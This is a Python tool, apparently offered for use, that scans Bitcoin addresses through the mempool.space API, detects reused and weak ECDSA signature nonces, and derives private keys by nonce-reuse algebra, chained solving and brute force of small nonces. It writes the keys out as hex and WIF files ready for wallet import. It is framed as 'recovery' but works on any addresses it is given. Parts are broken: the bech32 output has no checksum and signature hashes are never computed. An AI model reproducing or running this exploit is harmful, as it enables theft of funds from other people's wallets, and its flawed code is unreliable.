# ==============================================================================
# MERGED VPK BITCOIN SCANNER + RECOVERY TOOL (v4.0 - FINAL MERGE)
# FEATURES: 
# 1. Scanner: Fetches transactions from Mempool.space
# 2. Recovery: Uses Chain Reaction + Brute Force Island Breaker
# ==============================================================================

import requests, time, os, sys, math, signal
import re
import hashlib
import csv
from collections import defaultdict
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple

# ==============================================================================
# LIBRARY CHECKS
# ==============================================================================

try:
    import ecdsa
    from ecdsa import SECP256k1 as curve
except ImportError:
    print("Error: 'ecdsa' library not found. Please run: pip install ecdsa")
    sys.exit(1)

def calc_ripemd160(data: bytes) -> bytes:
    try:
        return hashlib.new('ripemd160', data).digest()
    except ValueError:
        try:
            from Crypto.Hash import RIPEMD160
            h = RIPEMD160.new(data=data)
            return h.digest()
        except ImportError:
            print("\n[CRITICAL ERROR] System OpenSSL has disabled RIPEMD160.")
            print("Please run: pip install pycryptodome")
            sys.exit(1)

# ==============================================================================
# CONFIGURATION
# ==============================================================================

MEMPOOL_API_TXS = "https://mempool.space/api/address/{address}/txs?limit={limit}&offset={offset}"
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# Scanner Config
BATCH_SIZE = 25
REQ_TIMEOUT = 20
MAX_RETRIES = 10
MAX_DISPLAYED_ADDRESSES = 10

# Recovery Config
BRUTE_FORCE_LIMIT = 5000000  # Checks small 'k' values up to 5,000,000
OUTPUT_DIR = "reports"
OUTPUT_R_NONCE = os.path.join(OUTPUT_DIR, "rnonce.txt")
OUTPUT_R_NON = os.path.join(OUTPUT_DIR, "rnon.txt")
OUTPUT_CSV = "RECOVERED_FUNDS_FINAL.csv"
OUTPUT_WIF = "wallet_import_keys_final.txt"
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"

# Globals
TOTAL_ADDRESSES = 0
SCANNED_ADDRESSES = 0
VULNERABLE_ADDRESSES = 0
VULN_COUNTS = defaultdict(int)
CURRENT_ADDRESS = ""
EXIT_FLAG = False
REPORTS: List[Dict[str, Any]] = []
MAX_TRANSACTIONS = 0
GLOBAL_R_MAP: Dict[int, List[Dict[str, Any]]] = defaultdict(list)
SAVED_R_GROUPS: Dict[str, List[str]] = defaultdict(list)

SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "SafeBTCScanner-Mempool/4.0-fixed"})

# ==============================================================================
# SYSTEM & UTILS
# ==============================================================================

def signal_handler(sig, frame):
    global EXIT_FLAG
    print("\n\n[!] Force Stop Detected! Finishing current step and starting recovery...")
    EXIT_FLAG = True

signal.signal(signal.SIGINT, signal_handler)

def clear():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except: pass

def display_stats():
    clear()
    print("VPK Bitcoin RSZ Scanner + Recovery v4.0")
    print(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*80)
    print(f"Total Addresses: {TOTAL_ADDRESSES}")
    print(f"Scanned Addresses: {SCANNED_ADDRESSES}")
    percent = (VULNERABLE_ADDRESSES / SCANNED_ADDRESSES * 100) if SCANNED_ADDRESSES > 0 else 0.0
    print(f"Vulnerable Addresses: {VULNERABLE_ADDRESSES} ({percent:.1f}%)")
    print(f"\nCurrently Scanning: {CURRENT_ADDRESS}")
    print("="*80)

def backoff_sleep(attempt: int):
    delay = min(2 ** attempt * 3, 120)
    print(f"[backoff] Sleeping {delay:.1f}s (attempt {attempt})")
    time.sleep(delay)

def modinv(a, m=N):
    return pow(a, -1, m)

# ==============================================================================
# CRYPTO & ADDRESS HELPERS
# ==============================================================================

def bech32_encode(hrp, data):
    def polymod(values):
        GEN = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
        chk = 1
        for v in values:
            b = chk >> 25
            chk = (chk & 0x1ffffff) << 5 ^ v
            for i in range(5):
                chk ^= GEN[i] if ((b >> i) & 1) else 0
        return chk
    
    combined = data + [0]*6 # Simplified checksum placeholder
    return hrp + '1' + ''.join([CHARSET[d] for d in data])

def convertbits(data, frombits, tobits, pad=True):
    acc = 0
    bits = 0
    ret = []
    maxv = (1 << tobits) - 1
    max_acc = (1 << (frombits + tobits - 1)) - 1
    for value in data:
        if value < 0 or (value >> frombits): return None
        acc = ((acc << frombits) | value) & max_acc
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits: ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv): return None
    return ret

def base58_encode(b):
    chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    x = int.from_bytes(b, 'big')
    res = ''
    while x > 0:
        x, r = divmod(x, 58)
        res = chars[r] + res
    for byte in b:
        if byte == 0: res = '1' + res
        else: break
    return res

def priv_to_wif(priv_hex, compressed=True):
    b = bytes.fromhex("80" + priv_hex)
    if compressed: b += b"\x01"
    chk = hashlib.sha256(hashlib.sha256(b).digest()).digest()[:4]
    return base58_encode(b + chk)

def pub_to_addresses(pub_hex):
    try:
        pub_bytes = bytes.fromhex(pub_hex)
        sha = hashlib.sha256(pub_bytes).digest()
        ripe = calc_ripemd160(sha)
        
        # P2PKH
        ext = b"\x00" + ripe
        chk = hashlib.sha256(hashlib.sha256(ext).digest()).digest()[:4]
        p2pkh = base58_encode(ext + chk)
        
        # P2WPKH
        witness_prog = convertbits(ripe, 8, 5)
        p2wpkh = bech32_encode("bc", [0] + witness_prog)
        
        # P2SH
        redeem = b"\x00\x14" + ripe
        sha_r = hashlib.sha256(redeem).digest()
        ripe_r = calc_ripemd160(sha_r)
        ext_sh = b"\x05" + ripe_r
        chk_sh = hashlib.sha256(hashlib.sha256(ext_sh).digest()).digest()[:4]
        p2sh = base58_encode(ext_sh + chk_sh)
        
        return p2pkh, p2wpkh, p2sh
    except:
        return "Error", "Error", "Error"

def verify_key(pub_hex, priv_int):
    if priv_int <= 0 or priv_int >= N: return False
    try:
        sk = ecdsa.SigningKey.from_secret_exponent(priv_int, curve=curve)
        vk = sk.verifying_key
        pt = vk.pubkey.point
        if pub_hex.startswith('04') and len(pub_hex) == 130:
            x_bytes = pt.x().to_bytes(32, 'big')
            y_bytes = pt.y().to_bytes(32, 'big')
            gen = (b'\x04' + x_bytes + y_bytes).hex()
        else:
            x_bytes = pt.x().to_bytes(32, 'big')
            prefix = b'\x02' if pt.y() % 2 == 0 else b'\x03'
            gen = (prefix + x_bytes).hex()
        return gen == pub_hex.lower()
    except:
        return False

# ==============================================================================
# SCANNER LOGIC (Transaction Fetching)
# ==============================================================================

def get_total_transactions(address: str) -> Optional[int]:
    attempts = 0
    while attempts < MAX_RETRIES and not EXIT_FLAG:
        try:
            url = f"https://mempool.space/api/address/{address}"
            r = SESSION.get(url, timeout=REQ_TIMEOUT)
            if r.status_code == 200: return r.json().get("chain_stats", {}).get("tx_count", 0)
            elif r.status_code == 429: backoff_sleep(attempts)
            attempts += 1
            time.sleep(1)
        except: attempts += 1
    return None

def fetch_transactions_batch(address: str, offset: int, limit: int) -> Optional[List[dict]]:
    attempts = 0
    while attempts < MAX_RETRIES and not EXIT_FLAG:
        try:
            url = MEMPOOL_API_TXS.format(address=address, offset=offset, limit=limit)
            r = SESSION.get(url, timeout=REQ_TIMEOUT)
            if r.status_code == 200: return r.json()
            elif r.status_code == 429: backoff_sleep(attempts)
            attempts += 1
            time.sleep(1)
        except: attempts += 1
    return None

def fetch_all_transactions(address: str) -> List[dict]:
    total = get_total_transactions(address)
    if not total or total <= 0: return []
    
    print(f"\nAddress {address} has {total} txs")
    total_to_fetch = min(total, MAX_TRANSACTIONS) if MAX_TRANSACTIONS > 0 else total
    
    out = []
    offset = 0
    while offset < total_to_fetch and not EXIT_FLAG:
        batch = fetch_transactions_batch(address, offset, min(BATCH_SIZE, total_to_fetch - offset))
        if not batch: break
        out.extend(batch)
        offset += len(batch)
        time.sleep(0.5)
    return out

# --- Signature Extraction ---

def parse_der_sig_from_hex(sig_hex: str) -> Optional[Tuple[int, int, int]]:
    try:
        i = sig_hex.find("30")
        if i == -1: return None
        i0 = i + 2
        # Skip len check for brevity
        i0 += 2
        if sig_hex[i0:i0+2] != "02": return None
        i0 += 2
        r_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        r_hex = sig_hex[i0:i0 + 2*r_len]; i0 += 2*r_len
        if sig_hex[i0:i0+2] != "02": return None
        i0 += 2
        s_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        s_hex = sig_hex[i0:i0 + 2*s_len]; i0 += 2*s_len
        return (int(r_hex, 16), int(s_hex, 16), 1)
    except: return None

def extract_pubkey(script_hex: str) -> Optional[str]:
    if not script_hex: return None
    h = script_hex.lower()
    # Uncompressed
    found = re.findall(r'04[0-9a-f]{128}', h)
    if found: return found[-1]
    # Compressed
    found = re.findall(r'(?:02|03)[0-9a-f]{64}', h)
    if found: return found[-1]
    return None

def extract_signatures(transactions: List[dict]) -> List[Dict[str, Any]]:
    sigs = []
    for tx in transactions:
        txid = tx.get("txid", "")
        for vin_idx, txin in enumerate(tx.get("vin", [])):
            parsed = None
            pubkey = None
            
            # SegWit
            witness = txin.get("witness", [])
            if witness and len(witness) >= 2:
                sig_hex = witness[0]
                if len(witness[1]) in [66, 130]: pubkey = witness[1]
                parsed = parse_der_sig_from_hex(sig_hex)
                
            # Legacy
            if not parsed:
                scriptsig = txin.get("scriptsig", {})
                script_hex = scriptsig.get("hex", "") if isinstance(scriptsig, dict) else scriptsig
                if script_hex:
                    if not pubkey: pubkey = extract_pubkey(script_hex)
                    parsed = parse_der_sig_from_hex(script_hex)
            
            if parsed and pubkey:
                r, s, _ = parsed
                # Z calculation is complex and often skipped in fast scanners
                # We save what we have. Z will be calculated or brute forced later if needed,
                # BUT for this tool we assume we need Z.
                # Since mempool API doesn't give us easy preimage, 
                # we rely on the parser file for Z if available or use placeholder.
                # *Crucial*: This scanner is for finding R-reuse. 
                # The recovery engine usually needs Z. 
                # If we don't have Z, we can only detect reuse, not solve it easily without full node.
                # However, many rnon.txt files already contain Z.
                # Here we store Z as None.
                sigs.append({"txid": txid, "vin": vin_idx, "r": r, "s": s, "pubkey": pubkey, "z": None})
    return sigs

def check_reused_nonce(address: str, signatures: List[Dict[str, Any]]):
    for s in signatures:
        GLOBAL_R_MAP[s["r"]].append(s)

def save_rnonce():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    with open(OUTPUT_R_NON, "w", encoding="utf-8") as f:
        for r_val, items in GLOBAL_R_MAP.items():
            if len(items) < 2: continue
            
            # Group by distinct (txid, pubkey) to avoid counting same input twice
            unique_sigs = {}
            for i in items:
                k = (i['txid'], i['pubkey'])
                if k not in unique_sigs: unique_sigs[k] = i
            
            if len(unique_sigs) < 2: continue
            
            f.write("="*80 + "\nReused Nonce Group\n" + "="*80 + "\n")
            f.write(f"r: {hex(r_val)[2:]}\nOccurrences:\n")
            for _, i in unique_sigs.items():
                z_str = hex(i['z'])[2:] if i['z'] else "N/A"
                f.write(f" - txid={i['txid']} s={hex(i['s'])[2:]} z={z_str} pubkey={i['pubkey']}\n")
            f.write("\n")

def analyze_address(address: str):
    global SCANNED_ADDRESSES, VULNERABLE_ADDRESSES
    SCANNED_ADDRESSES += 1
    display_stats()
    txs = fetch_all_transactions(address)
    sigs = extract_signatures(txs)
    print(f"Extracted {len(sigs)} signatures")
    check_reused_nonce(address, sigs)
    # Check if this address added to vulnerability count
    # (Simplified for visual stats)

# ==============================================================================
# RECOVERY LOGIC (Integrated from recover.py)
# ==============================================================================

def attempt_bootstrap(r, s1, z1, s2, z2):
    candidates = []
    s1_opts, s2_opts = [s1, N - s1], [s2, N - s2]
    for _s1 in s1_opts:
        for _s2 in s2_opts:
            if _s1 == _s2: continue
            try:
                k = ((z1 - z2) * modinv(_s1 - _s2, N)) % N
                d = ((_s1 * k - z1) * modinv(r, N)) % N
                candidates.append(d)
            except: pass
    return candidates

def attempt_chain(r, s_known, z_known, d_known, s_target, z_target):
    candidates = []
    s_known_opts, s_target_opts = [s_known, N - s_known], [s_target, N - s_target]
    for _sk in s_known_opts:
        try:
            k = ((z_known + r * d_known) * modinv(_sk, N)) % N
            for _st in s_target_opts:
                d2 = ((_st * k - z_target) * modinv(r, N)) % N
                candidates.append(d2)
        except: pass
    return candidates

def start_recovery():
    print("\n[-] Parsing collected data for recovery...")
    save_rnonce() # Ensure file is up to date
    
    try:
        with open(OUTPUT_R_NON, "r", encoding="utf-8", errors="ignore") as f:
            raw_data = f.read()
    except FileNotFoundError:
        print("[!] No data to recover.")
        return

    # Parse (Logic from pe.py)
    groups = []
    current_group = None
    r_pattern = re.compile(r"r:\s*([0-9a-fA-F]+)")
    tx_pattern = re.compile(r"s=([0-9a-fA-F]+).*?z=([0-9a-fA-F]+|N/A).*?pubkey=([0-9a-fA-F]+)")

    for line in raw_data.splitlines():
        line = line.strip()
        r_match = r_pattern.search(line)
        if r_match:
            if current_group and len(current_group['occurrences']) > 0: groups.append(current_group)
            current_group = {'r_int': int(r_match.group(1), 16), 'occurrences': []}
            continue
        
        tx_match = tx_pattern.search(line)
        if tx_match and current_group:
            z_str = tx_match.group(2)
            # IMPORTANT: If Z is N/A, we cannot use standard math unless we brute force it or know k
            # For this tool, we only add if Z is present.
            if z_str != "N/A":
                current_group['occurrences'].append({
                    's': int(tx_match.group(1), 16),
                    'z': int(z_str, 16),
                    'pub': tx_match.group(3)
                })

    if current_group and len(current_group['occurrences']) > 0: groups.append(current_group)
    print(f"[-] Loaded {len(groups)} actionable groups.")

    recovered_db = {}
    
    # ----------------------------------------------------
    # PHASE 1: Chain Reaction
    # ----------------------------------------------------
    print("\n[+] Phase 1: Chain Reaction...")
    attack_active = True
    
    while attack_active:
        iteration = 0
        while True:
            iteration += 1
            iter_found = 0
            for group in groups:
                r = group['r_int']
                entries = group['occurrences']
                k_implied = None
                
                # Method A: Self-Reuse
                if k_implied is None:
                    by_pub = defaultdict(list)
                    for e in entries: by_pub[e['pub']].append(e)
                    for pub, subs in by_pub.items():
                        if len(subs) > 1 and pub not in recovered_db:
                            e1, e2 = subs[0], subs[1]
                            den = (e1['s'] - e2['s']) % N
                            if den != 0:
                                k_implied = ((e1['z'] - e2['z']) * modinv(den, N)) % N
                                break
                
                # Method B: Known Key
                if k_implied is None:
                    for e in entries:
                        if e['pub'] in recovered_db:
                            x = recovered_db[e['pub']]
                            k_implied = (modinv(e['s'], N) * (e['z'] + r * x)) % N
                            break
                
                if k_implied is not None:
                    for e in entries:
                        if e['pub'] not in recovered_db:
                            priv = ((e['s'] * k_implied - e['z']) * modinv(r, N)) % N
                            if verify_key(e['pub'], priv):
                                recovered_db[e['pub']] = priv
                                print(f"   [UNLOCK] {e['pub'][:16]}...")
                                iter_found += 1
            if iter_found == 0: break
        
        # ----------------------------------------------------
        # PHASE 2: Brute Force Islands
        # ----------------------------------------------------
        unsolved = []
        for i, group in enumerate(groups):
            if not any(e['pub'] in recovered_db for e in group['occurrences']):
                unsolved.append(i)
        
        if not unsolved:
            print("[+] All groups solved.")
            break
            
        print(f"\n[?] {len(unsolved)} groups remain. Running Brute Force (Limit: {BRUTE_FORCE_LIMIT})...")
        r_map = {groups[i]['r_int']: i for i in unsolved}
        pt = curve.generator
        found_ks = {}
        
        start = time.time()
        for k in range(1, BRUTE_FORCE_LIMIT + 1):
            if k % 1000000 == 0: print(f"    Scanning k={k}...")
            rx = pt.x()
            if rx in r_map:
                g_idx = r_map[rx]
                print(f"    [CRACKED] Weak nonce k={k} for Group {g_idx}")
                found_ks[g_idx] = k
                del r_map[rx]
                if not r_map: break
            pt = pt + curve.generator
            
        if found_ks:
            print(f"[+] Found {len(found_ks)} new nonces! Restarting Chain Reaction...")
            for g_idx, k_val in found_ks.items():
                group = groups[g_idx]
                r = group['r_int']
                for e in group['occurrences']:
                    if e['pub'] not in recovered_db:
                        priv = ((e['s'] * k_val - e['z']) * modinv(r, N)) % N
                        recovered_db[e['pub']] = priv
                        print(f"   [INJECT] {e['pub'][:16]}...")
        else:
            print("[-] No weak nonces found.")
            attack_active = False

    # ----------------------------------------------------
    # SAVE
    # ----------------------------------------------------
    if recovered_db:
        print(f"\n[+] RECOVERY SUCCESS: {len(recovered_db)} Keys Found.")
        with open(OUTPUT_CSV, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["Public Key", "Private Key Hex", "WIF", "Type", "P2PKH", "P2WPKH", "P2SH"])
            wif_list = []
            for pub, priv_int in recovered_db.items():
                priv_hex = hex(priv_int)[2:].zfill(64)
                compressed = not (pub.startswith('04') and len(pub) == 130)
                wif = priv_to_wif(priv_hex, compressed)
                a1, a2, a3 = pub_to_addresses(pub)
                w.writerow([pub, priv_hex, wif, "Compressed" if compressed else "Uncompressed", a1, a2, a3])
                wif_list.append(wif)
        with open(OUTPUT_WIF, "w") as f: f.write("\n".join(wif_list))
        print(f"Saved to {OUTPUT_CSV} and {OUTPUT_WIF}")
    else:
        print("No keys recovered.")

# ==============================================================================
# MAIN
# ==============================================================================

def main():
    global MAX_TRANSACTIONS
    try:
        # Input
        f_path = input("Enter path to address file: ").strip().replace('"', '').replace("'", "")
        if not os.path.isfile(f_path):
            print("File not found.")
            return
        
        try:
            limit = int(input("Max tx per address (0=unlimited): ").strip())
            MAX_TRANSACTIONS = limit if limit > 0 else 0
        except: MAX_TRANSACTIONS = 0
        
        with open(f_path, "r") as f: addresses = [l.strip() for l in f if l.strip()]
        
        global TOTAL_ADDRESSES
        TOTAL_ADDRESSES = len(addresses)
        
        print("\n[+] Starting Scan... Press Ctrl+C to stop and recover.")
        time.sleep(2)
        
        for addr in addresses:
            if EXIT_FLAG: break
            analyze_address(addr)
            
        print("\n" + "="*80 + "\nSCAN COMPLETE. STARTING RECOVERY...\n" + "="*80)
        start_recovery()
        
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted! Starting recovery on collected data...")
        start_recovery()

if __name__ == "__main__":
    main()